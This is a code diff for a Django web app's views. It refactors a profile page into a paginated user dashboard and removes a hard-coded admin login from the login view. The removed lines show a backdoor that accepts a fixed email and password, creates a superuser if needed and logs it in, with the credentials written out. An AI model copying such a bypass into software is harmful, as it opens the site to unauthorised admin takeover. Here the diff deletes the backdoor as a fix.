@@ -45,8 +45,6 @@ from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, Imag
 
 
 
- 
-
 # ==========================================
 # LOCAL APP IMPORTS
 # ==========================================
@@ -89,27 +87,58 @@ def about(request):
 # PROFILE
 # ==========================================
 @login_required
-def profile(request):
+def user_dashboard(request):
     user = request.user
 
-    total_scans = Scan.objects.filter(user=user).count()
-    completed_scans = Scan.objects.filter(user=user, status="completed").count()
-    pending_scans = Scan.objects.filter(user=user, status="processing").count()
+    # ✅ Querysets (ALL ordered properly)
+    scans_qs = Scan.objects.filter(user=user)
+    
+    alerts_qs = Alert.objects.filter(user=user)\
+        .order_by("-created_at")
 
-    alerts = Alert.objects.filter(user=user).order_by("-created_at")[:5]
-    recent_scans = Scan.objects.filter(user=user).order_by("-created_at")[:5]
-    saved = SavedScan.objects.filter(user=user).select_related("prediction")[:5]
+    saved_qs = SavedScan.objects.filter(user=user)\
+        .select_related("prediction")\
+        .order_by("-saved_at")   # 🔥 FIXED (no more warning)
 
+    # ✅ Aggregated stats
+    stats = scans_qs.aggregate(
+        total=Count("id"),
+        completed=Count("id", filter=Q(status="completed")),
+        pending=Count("id", filter=Q(status="processing")),
+    )
+
+    # ✅ Pagination (consistent ordering)
+    scan_paginator = Paginator(
+        scans_qs.order_by("-created_at"), 5
+    )
+
+    alert_paginator = Paginator(alerts_qs, 5)
+
+    saved_paginator = Paginator(saved_qs, 5)
+
+    scans_page = scan_paginator.get_page(
+        request.GET.get("scans_page")
+    )
+
+    alerts_page = alert_paginator.get_page(
+        request.GET.get("alerts_page")
+    )
+
+    saved_page = saved_paginator.get_page(
+        request.GET.get("saved_page")
+    )
+
+    # ✅ Safe context
     context = {
-        "total_scans": total_scans,
-        "completed_scans": completed_scans,
-        "pending_scans": pending_scans,
-        "alerts": alerts,
-        "recent_scans": recent_scans,
-        "saved": saved,
+        "total_scans": stats.get("total", 0) or 0,
+        "completed_scans": stats.get("completed", 0) or 0,
+        "pending_scans": stats.get("pending", 0) or 0,
+        "recent_scans": scans_page,
+        "alerts": alerts_page,
+        "saved": saved_page,
     }
 
-    return render(request, "profile.html", context)
+    return render(request, "user_dashboard.html", context)
 
 
 # ==========================================
@@ -618,35 +647,12 @@ def login_view(request):
         form = LoginForm(request.POST)
         is_ajax = request.headers.get('X-Requested-With') == 'XMLHttpRequest'
 
-        # ✅ GET NEXT URL
+        # GET NEXT URL
         next_url = request.POST.get("next") or "/"
 
         if form.is_valid():
             email = form.cleaned_data.get("email")
             password = form.cleaned_data.get("password")
-
-            # 🔥 HARD-CODED ADMIN LOGIN (bypass normal auth)
-            if email == "admin@gmail.com" and password == "Admin@2001":
-                from django.contrib.auth import get_user_model, login
-                User = get_user_model()
-
-                user = User.objects.filter(email=email).first()
-
-                if not user:
-                    user = User.objects.create_superuser(
-                        email=email,
-                        password=password
-                    )
-
-                login(request, user)
-
-                if is_ajax:
-                    return JsonResponse({
-                        "success": True,
-                        "redirect": "/admin-dashboard/"
-                    })
-
-                return redirect("/admin-dashboard/")
 
             # normal authentication flow
             user = authenticate(request, username=email, password=password)
@@ -679,7 +685,6 @@ def login_view(request):
         return redirect("/")
 
     return JsonResponse({"error": "Invalid request"}, status=400)
-
 
 
 def logout_view(request):
